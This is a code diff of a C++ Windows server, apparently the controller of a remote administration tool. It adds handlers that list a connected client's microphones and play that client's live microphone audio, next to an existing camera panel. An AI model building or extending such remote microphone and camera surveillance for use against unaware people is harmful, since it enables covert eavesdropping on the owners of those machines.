@@ -13,6 +13,56 @@
 Servidor* p_Servidor;
 std::mutex vector_mutex;
 
+void G_ReproducirPaquete(char* pBuffer, size_t iLen) {
+    std::cout << "[MIC] " << iLen << "\n";
+    // Configurar formato de audio para reproducción
+    HWAVEOUT wo;
+    WAVEFORMATEX wfx = {};
+    wfx.wFormatTag = WAVE_FORMAT_PCM;
+    wfx.nChannels = 2;
+    wfx.nSamplesPerSec = 44100; // 7.0khz
+    wfx.wBitsPerSample = 16;
+    wfx.nBlockAlign = wfx.wBitsPerSample * wfx.nChannels / 8;
+    wfx.nAvgBytesPerSec = wfx.nBlockAlign * wfx.nSamplesPerSec;
+    //wfx.cbSize = 0;
+    // Abrir el dispositivo de reproducción de audio
+
+    if (sizeof(wfx) != sizeof(WAVEFORMATEX)) {
+        std::cerr << "Tamaño incorrecto de la estructura WAVEFORMATEX." << std::endl;
+        return;
+    }
+
+    WAVEHDR header = {};
+
+    header.lpData = pBuffer;
+    header.dwBufferLength = iLen;
+
+    // Intentar abrir el dispositivo de reproducción de audio
+    if (waveOutOpen(&wo, WAVE_MAPPER, &wfx, NULL, NULL, CALLBACK_NULL) != MMSYSERR_NOERROR) {
+        std::cerr << "Error al abrir el dispositivo de reproducción de audio" << std::endl;
+        return;
+    }
+
+    if (waveOutPrepareHeader(wo, &header, sizeof(header)) != MMSYSERR_NOERROR) {
+        std::cerr << "Error al preparar el encabezado del buffer de audio" << std::endl;
+        waveOutUnprepareHeader(wo, &header, sizeof(header));
+        waveOutClose(wo);
+        return;
+    }
+    if (waveOutWrite(wo, &header, sizeof(header)) != MMSYSERR_NOERROR) {
+        std::cerr << "Error al escribir el buffer de audio en el dispositivo de reproducción" << std::endl;
+        waveOutUnprepareHeader(wo, &header, sizeof(header));
+        waveOutClose(wo);
+        return;
+    }
+
+    while (waveOutUnprepareHeader(wo, &header, sizeof(header)) == WAVERR_STILLPLAYING) {
+        Sleep(100); // Espera un poco antes de intentar nuevamente
+    }
+
+    waveOutClose(wo);
+}
+
 void Cliente_Handler::Spawn_Handler(){
     this->isRunning = true;
     int iBufferSize = 1024 * 100;
@@ -281,7 +331,37 @@ void Cliente_Handler::Spawn_Handler(){
             }else {
                 this->Log("[X] No se pudo encontrar el panel de camara");
             }
+            continue;
 ;        }
+
+        if (vcDatos[0] == std::to_string(EnumComandos::Mic_Refre_Resultado)) {
+            vcDatos = strSplit(std::string(cBuffer), CMD_DEL, 15);
+            
+            wxArrayString cli_devices;
+            for (int i = 1; i<int(vcDatos.size()); i++) {
+                cli_devices.push_back(vcDatos[i]);
+            }
+
+            panelMicrophone* temp_panel = (panelMicrophone*)wxWindow::FindWindowById(EnumIDS::ID_Panel_Microphone, this->n_Frame);
+            if (temp_panel) {
+                wxComboBox* temp_combo_box = (wxComboBox*)wxWindow::FindWindowById(EnumIDS::ID_Panel_Mic_CMB_Devices, temp_panel);
+                if (temp_combo_box) {
+                    temp_combo_box->Clear();
+                    temp_combo_box->Append(cli_devices);
+                }
+            }else {
+                std::cout << "No se pudo encontrar ventana activa\n";
+            }
+            continue;
+        }
+
+        if (vcDatos[0] == std::to_string(EnumComandos::Mic_Live_Packet)) {
+            int iHeadSize = vcDatos[0].size() - 1;
+            int iRawSize = iRecibido - iHeadSize;
+            char* cBuff = cBuffer + iHeadSize;
+            G_ReproducirPaquete(cBuff, iRawSize);
+            continue;
+        }
 
     }
 
@@ -711,34 +791,23 @@ void Servidor::m_ReproducirPaquete(char* pBuffer, size_t iLen) {
         return;
     }
 
-    try {
-        if (waveOutPrepareHeader(wo, &header, sizeof(header)) != MMSYSERR_NOERROR) {
-            std::cerr << "Error al preparar el encabezado del buffer de audio" << std::endl;
-            waveOutUnprepareHeader(wo, &header, sizeof(header));
-            waveOutClose(wo);
-            return;
-        }
-    }catch (const std::exception& e) {
-        std::cerr << "Excepción al preparar el encabezado del buffer de audio: " << e.what() << std::endl;
-        waveOutClose(wo);
-        return;
-    }
-
-    try {
-        if (waveOutWrite(wo, &header, sizeof(header)) != MMSYSERR_NOERROR) {
-            std::cerr << "Error al escribir el buffer de audio en el dispositivo de reproducción" << std::endl;
-            waveOutUnprepareHeader(wo, &header, sizeof(header));
-            waveOutClose(wo);
-            return;
-        }
-    }catch (const std::exception& e) {
-        std::cerr << "Excepción al escribir el buffer de audio en el dispositivo de reproducción: " << e.what() << std::endl;
+    if (waveOutPrepareHeader(wo, &header, sizeof(header)) != MMSYSERR_NOERROR) {
+        std::cerr << "Error al preparar el encabezado del buffer de audio" << std::endl;
         waveOutUnprepareHeader(wo, &header, sizeof(header));
         waveOutClose(wo);
         return;
     }
-
-    waveOutUnprepareHeader(wo, &header, sizeof(header));
+    if (waveOutWrite(wo, &header, sizeof(header)) != MMSYSERR_NOERROR) {
+        std::cerr << "Error al escribir el buffer de audio en el dispositivo de reproducción" << std::endl;
+        waveOutUnprepareHeader(wo, &header, sizeof(header));
+        waveOutClose(wo);
+        return;
+    }
+    
+    while (waveOutUnprepareHeader(wo, &header, sizeof(header)) == WAVERR_STILLPLAYING) {
+        Sleep(100); // Espera un poco antes de intentar nuevamente
+    }
+    
     waveOutClose(wo);
 }
 
